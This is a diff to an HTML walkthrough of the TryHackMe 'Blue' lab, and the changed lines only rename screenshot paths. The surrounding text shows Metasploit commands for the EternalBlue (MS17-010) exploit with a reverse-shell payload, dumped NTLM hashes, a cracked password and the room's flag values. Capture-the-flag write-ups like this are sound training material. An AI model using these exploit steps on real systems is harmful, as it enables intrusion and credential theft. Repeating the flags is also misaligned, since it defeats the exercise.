@@ -500,7 +500,7 @@ Host script results:
 |_smb-security-mode: message_signing: disabled (dangerous, but default)</div>
             </div>
 
-            <img src="./Screenshot From 2026-08-22 17-27-01.png" alt="Nmap Scan Output">
+            <img src="../images/blue/blue_17-27-01.png" alt="Nmap Scan Output">
         </section>
 
         <!-- Step 2: Exploitation -->
@@ -508,7 +508,7 @@ Host script results:
             <h2><span class="step-num">2</span> Vulnerability Scanning & RCE Exploitation</h2>
             <p>Metasploit was utilized to search for <code>ms17-010</code> exploit modules and verify target vulnerability.</p>
 
-            <img src="./Screenshot From 2026-08-22 19-50-15.png" alt="Metasploit Search MS17-010">
+            <img src="../images/blue/blue_19-50-15.png" alt="Metasploit Search MS17-010">
 
             <p>The scanner <code>auxiliary/scanner/smb/smb_ms17_010</code> confirmed the target machine was vulnerable. The exploit module <code>exploit/windows/smb/ms17_010_eternalblue</code> was selected and configured:</p>
 
@@ -521,10 +521,10 @@ msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_
 msf exploit(ms17_010_eternalblue) > exploit</code></pre>
             </div>
 
-            <img src="./Screenshot From 2026-08-22 19-50-34.png" alt="Metasploit Options Setup">
-            <img src="./Screenshot From 2026-08-22 19-50-47.png" alt="Setting RHOSTS">
-            <img src="./Screenshot From 2026-08-22 19-55-02.png" alt="Setting LHOST">
-            <img src="./Screenshot From 2026-08-22 20-14-03.png" alt="Meterpreter Shell Session Established">
+            <img src="../images/blue/blue_19-50-34.png" alt="Metasploit Options Setup">
+            <img src="../images/blue/blue_19-50-47.png" alt="Setting RHOSTS">
+            <img src="../images/blue/blue_19-55-02.png" alt="Setting LHOST">
+            <img src="../images/blue/blue_20-14-03.png" alt="Meterpreter Shell Session Established">
 
             <div class="callout success">
                 <strong>Exploit Success:</strong> Nonpaged pool memory allocation succeeded, establishing a Meterpreter shell with full <code>NT AUTHORITY\SYSTEM</code> authority.
@@ -548,7 +548,7 @@ Guest:501:aad3b435b1404eeaad3b435b1404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1002:aad3b435b1404eeaad3b435b1404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::</code></pre>
             </div>
 
-            <img src="./Screenshot From 2026-08-22 20-57-28.png" alt="Migration and Hashdump Output">
+            <img src="../images/blue/blue_20-57-28.png" alt="Migration and Hashdump Output">
         </section>
 
         <!-- Step 4: Credential Cracking -->
@@ -567,7 +567,7 @@ Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
 Password.........: alqfna2</div>
             </div>
 
-            <img src="./Screenshot From 2026-08-22 21-01-52.png" alt="Hashcat Password Crack Output">
+            <img src="../images/blue/blue_21-01-52.png" alt="Hashcat Password Crack Output">
 
             <div class="callout success">
                 <strong>Cracked Credentials:</strong> Username: <code>Jon</code> | Password: <code>alqfna2</code>
@@ -584,24 +584,24 @@ Password.........: alqfna2</div>
                 <div class="flag-label">Location: C:\flag1.txt</div>
                 <div class="flag-value">flag{access_the_machine}</div>
             </div>
-            <img src="./Screenshot From 2026-08-22 21-13-35.png" alt="Flag 1 Screenshot">
+            <img src="../images/blue/blue_21-13-35.png" alt="Flag 1 Screenshot">
 
             <h3>Flag 2 — SAM Config Directory</h3>
             <div class="flag-box">
                 <div class="flag-label">Location: C:\Windows\System32\config\flag2.txt</div>
                 <div class="flag-value">flag{sam_database_elevated_access}</div>
             </div>
-            <img src="./Screenshot From 2026-08-22 21-16-55.png" alt="Flag 2 Screenshot">
+            <img src="../images/blue/blue_21-16-55.png" alt="Flag 2 Screenshot">
 
             <h3>Flag 3 — User Documents Directory</h3>
             <div class="flag-box">
                 <div class="flag-label">Location: C:\Users\Jon\Documents\flag3.txt</div>
                 <div class="flag-value">flag{admin_documents_can_be_valuable}</div>
             </div>
-            <img src="./Screenshot From 2026-08-22 21-21-11.png" alt="Flag 3 Screenshot">
+            <img src="../images/blue/blue_21-21-11.png" alt="Flag 3 Screenshot">
 
             <h3>Room Completion Status</h3>
-            <img src="./Screenshot From 2026-08-22 21-21-49.png" alt="TryHackMe Room 100% Completion">
+            <img src="../images/blue/blue_21-21-49.png" alt="TryHackMe Room 100% Completion">
         </section>
 
         <!-- Summary Matrix -->
